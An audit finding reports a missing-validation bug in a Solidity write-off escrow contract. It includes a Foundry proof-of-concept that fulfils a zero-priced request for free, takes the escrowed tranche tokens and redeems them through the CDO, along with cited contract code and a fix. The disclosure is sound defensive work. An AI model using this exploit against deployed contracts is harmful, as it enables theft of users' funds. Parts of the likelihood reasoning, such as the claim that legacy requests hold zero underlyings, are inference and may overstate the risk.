### Title
Missing `underlyingsRequested` validation lets any fulfiller seize escrowed tranche tokens for free - (File: contracts/IdleCreditVaultWriteOffEscrow.sol)

### Summary
The write-off escrow validates that `amount != 0` when a request is created, but never validates `underlyingsRequested`. A request can therefore exist with `tranches > 0` and `underlyings == 0` (user error, or a legacy request migrated from a schema that predates the `underlyings`/`pendingUnderlyings` accounting — the contract explicitly handles such legacy requests in `deleteWriteOffRequest`/`fullfillWriteOffRequest`). `fullfillWriteOffRequest` only checks `_underlyings < currentRequest.underlyings`, so for a zero-priced request any unprivileged EOA can call it with `_underlyings = 0`, pay nothing, and receive all escrowed tranche tokens — which are then redeemable through `requestWithdraw`/`claimWithdrawRequest` for real pool value. This is the on-chain analog of CVE-2016-8647: a missing input validation leaves the intended protection (the ask price guarding the escrowed tranches) effectively absent while the operation still "succeeds".

### Finding Description
`createWriteOffRequest` reverts only on `amount == 0` and on `!isEpochRunning`; `underlyingsRequested` is unconstrained and can be `0` [1](#0-0) . Fulfillment then enforces only `currentRequest.tranches != _tranches || _underlyings < currentRequest.underlyings` — an equality on tranches and a lower bound on underlyings [2](#0-1) . With `currentRequest.underlyings == 0`, the bound is satisfied by `_underlyings == 0`, the fulfiller pays 0 underlying, the user receives 0 (fee is 0), and the fulfiller receives the full tranche balance [3](#0-2) .

Zero-`underlyings` requests are realistic because the code itself accounts for "legacy requests that were never added to pendingUnderlyings", i.e., requests written under an older storage schema where the field is effectively unset/zero [4](#0-3) . No KYC/whitelist check applies to the fulfiller — fulfillment is explicitly permissionless [5](#0-4) , and tests confirm a non-Keyring buyer can fulfill [6](#0-5) .

### Impact Explanation
Direct theft of the victim's escrowed tranche tokens at zero cost. The attacker can then either hold the tranches or redeem them: a tranche holder (or KYC-passing lender) can call `requestWithdraw`/`claimWithdrawRequest` on the `IdleCDOEpochVariant` to extract underlying at the tranche price [7](#0-6) . Loss equals the full underlying value of the escrowed tranches; the victim receives nothing and the request is deleted.

### Likelihood Explanation
Requires a request with `underlyings == 0`. This occurs for any pre-upgrade/legacy request whose `underlyings` field was never set (the storage comments confirm such requests exist and are supported), and for any user who deposits tranches intending a price update in a second call (each `createWriteOffRequest` requires `amount > 0`, so a zero-additional-price state is common between successive deposits). No privileged actor is involved and the attack is a single permissionless transaction during a running epoch.

### Recommendation
Revert in `createWriteOffRequest` when `underlyingsRequested == 0` (i.e., require `underlyingsRequested > 0` so every escrowed tranche amount has a positive ask). For already-existing requests with `underlyings == 0`, either add a dedicated owner/migration cleanup or make `fullfillWriteOffRequest` revert on `currentRequest.underlyings == 0` so zero-priced requests can only be cancelled via `deleteWriteOffRequest` by their owner. Additionally consider requiring `msg.sender == borrower` or an explicit per-request buyer allowlist to remove unsolicited third-party fulfillment.

### Proof of Concept
Foundry-style PoC against the existing test harness (mirroring `IdleCreditVaultWriteOffEscrow.t.sol`):

```solidity
// contracts/IdleCreditVaultWriteOffEscrow.sol scenario
function testZeroPriceRequestFulfilledForFree() external {
    // epoch running; LP deposits tranches with a zero/unset underlying ask
    // (or simulate a legacy request where `underlyings` was never set)
    vm.prank(LP);
    escrow.createWriteOffRequest(10_000e18, 0);

    address attacker = makeAddr("attacker");
    uint256 attackerTranchePre = tranche.balanceOf(attacker);

    // attacker pays nothing, takes all escrowed tranche tokens
    vm.prank(attacker);
    escrow.fullfillWriteOffRequest(LP, 10_000e18, 0);

    assertEq(tranche.balanceOf(attacker) - attackerTranchePre, 10_000e18);
    assertEq(underlying.balanceOf(LP), 0); // victim received nothing

    // attacker redeems the stolen tranches for underlying via the CDO
    vm.startPrank(attacker);
    cdoEpoch.requestWithdraw(0, address(tranche));
    // ... epoch stop/start, then:
    cdoEpoch.claimWithdrawRequest();
    vm.stopPrank();
    assertGt(underlying.balanceOf(attacker), 0);
}
```

Note: the PoC assumes an epoch-running vault configured as in `test/foundry/IdleCreditVaultWriteOffEscrow.t.sol`; a legacy-schema request (underlyings unset) is equivalent and can be simulated with `stdstore` on `userRequests` exactly as `_setLegacyWriteOffRequest` does in the existing test file.

### Citations

**File:** contracts/IdleCreditVaultWriteOffEscrow.sol (L86-101)
```text
  function createWriteOffRequest(uint256 amount, uint256 underlyingsRequested) external nonReentrant {
    // can request write off only when epoch is running
    if (!IdleCDOEpochVariant(idleCDOEpoch).isEpochRunning()) revert EpochNotRunning();
    // cannot request write off with 0 tranche tokens
    if (amount == 0) revert NotAllowed();

    // get tranche tokens from user
    IERC20Detailed(tranche).safeTransferFrom(msg.sender, address(this), amount);
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[msg.sender];
    // update user requests
    userRequests[msg.sender] = WriteOffRequest({
      tranches: currentRequest.tranches + amount,
      underlyings: currentRequest.underlyings + underlyingsRequested
    });
    pendingUnderlyings += underlyingsRequested;
```

**File:** contracts/IdleCreditVaultWriteOffEscrow.sol (L122-123)
```text
  /// @dev this function can be called by any wallet
  function fullfillWriteOffRequest(address _user, uint256 _tranches, uint256 _underlyings) external nonReentrant {
```

**File:** contracts/IdleCreditVaultWriteOffEscrow.sol (L127-131)
```text
    if (currentRequest.tranches == 0) revert Is0();
    // check if the request matches at least the expected values (borrower can choose to overpay if needed, but not underpay)
    if (currentRequest.tranches != _tranches || _underlyings < currentRequest.underlyings) {
      revert WrongRequest();
    }
```

**File:** contracts/IdleCreditVaultWriteOffEscrow.sol (L133-134)
```text
    // Existing upgraded escrows can have legacy requests that were never added to pendingUnderlyings.
    pendingUnderlyings -= pendingUnderlyings >= currentRequest.underlyings ? currentRequest.underlyings : pendingUnderlyings;
```

**File:** contracts/IdleCreditVaultWriteOffEscrow.sol (L139-151)
```text
    underlyingToken.safeTransferFrom(msg.sender, address(this), _underlyings);
    // check if the exit fee is set and if so, apply it
    uint256 _exitFee = exitFee;
    uint256 _totFee;
    if (_exitFee > 0) {
      _totFee = (_underlyings * _exitFee) / FULL_VALUE;
      // transfer exit fee to the feeReceiver
      underlyingToken.safeTransfer(feeReceiver, _totFee);
    }
    // transfer the remaining underlyings to the user
    underlyingToken.safeTransfer(_user, _underlyings - _totFee);
    // transfer tranche tokens to fulfiller
    IERC20Detailed(tranche).safeTransfer(msg.sender, _tranches);
```

**File:** test/foundry/IdleCreditVaultWriteOffEscrow.t.sol (L247-273)
```text
  function testNonKeyringBuyerCanFulfillExistingRequestButCannotWithdraw() external {
    uint256 requestedTranches = 10000e18;
    uint256 requestedUnderlyings = 10000e6;
    address buyer = makeAddr("buyer");
    address keyring = address(1);

    vm.prank(LP);
    escrow.createWriteOffRequest(requestedTranches, requestedUnderlyings);

    vm.prank(cdoEpoch.owner());
    cdoEpoch.setKeyringParams(keyring, 1);

    vm.mockCall(
      keyring,
      abi.encodeWithSelector(IKeyring.checkCredential.selector),
      abi.encode(false)
    );

    deal(address(underlying), buyer, requestedUnderlyings);
    uint256 balPreBuyer = underlying.balanceOf(buyer);
    uint256 balPreLP = underlying.balanceOf(LP);
    uint256 balPreBuyerTranche = tranche.balanceOf(buyer);
    uint256 balPreFeeReceiver = underlying.balanceOf(TL_MULTISIG);

    vm.startPrank(buyer);
    underlying.approve(address(escrow), requestedUnderlyings);
    escrow.fullfillWriteOffRequest(LP, requestedTranches, requestedUnderlyings);
```

**File:** contracts/IdleCDOEpochVariant.sol (L739-791)
```text
  function requestWithdraw(uint256 _amount, address _tranche) external returns (uint256 _underlyings) {
    _checkTranche(_tranche);
    _checkNotAllowed(
      (_tranche == AATranche ? !allowAAWithdrawRequest : !allowBBWithdrawRequest) ||
      !isWalletAllowed(msg.sender)
    );
  
    // we check if there are donated assets to the pool and transfer them to the feeReceiver if any
    _skimDonatedAssets();

    // we trigger an update accounting to check for eventual losses
    _updateAccounting();

    IdleCreditVault creditVault = IdleCreditVault(strategy);
    if (_amount == 0) {
      _amount = _userTrancheBal(msg.sender, _tranche);
    }
    _underlyings = _trancheToUnderlyings(_amount, _tranche);

    // Programmable borrower deployments do not support instant withdrawals.
    // If apr decresed wrt last epoch, request instant withdraw and burn tranche tokens directly
    // we compare unscaled aprs
    if (_isInstantWithdrawEnabled()) {
      uint256 currentApr = creditVault.unscaledApr();
      if (lastEpochApr > (currentApr + instantWithdrawAprDelta)) {
        // burn strategy tokens from cdo and mint an equal amount to msg.sender as receipt
        creditVault.requestInstantWithdraw(_underlyings, msg.sender);
        // burn tranche tokens and decrease NAV
        _withdrawOps(_amount, _underlyings, _tranche);
        return _underlyings;
      }
    }

    uint256 principal = _underlyings;
    (uint256 interest, int256 diff) = _calcInterestWithdrawRequest(_underlyings, _tranche);
    uint256 totalFees = _totalWithdrawFees(principal, interest);
    // user is requesting principal + interest minus upfront management fee and net performance fee
    _underlyings = principal + interest - totalFees;
    // add expected fees to pending withdraw fees counter
    pendingWithdrawFees += totalFees;

    /// if there is an AA withdrawal the overperformance that the amount withdrawed would have generated for BB tranches
    /// is saved in interestForOverUnderPerformance. This is used to calculate the interest that should be added to the
    /// expectedEpochInterest at the startEpoch.
    /// If there is a BB withdrawal this amount is subtracted from the expectedEpochInterest
    interestForOverUnderPerformance += diff;

    // The receipt is fixed now and leaves live NAV. Charge management fees upfront
    // for the time it waits outside live NAV: remaining buffer plus the next epoch.
    creditVault.requestWithdraw(_underlyings, msg.sender, principal);
    // burn tranche tokens and decrease NAV without interest for the next epoch as it was not yet counted in NAV
    _withdrawOps(_amount, principal, _tranche);
  }
```
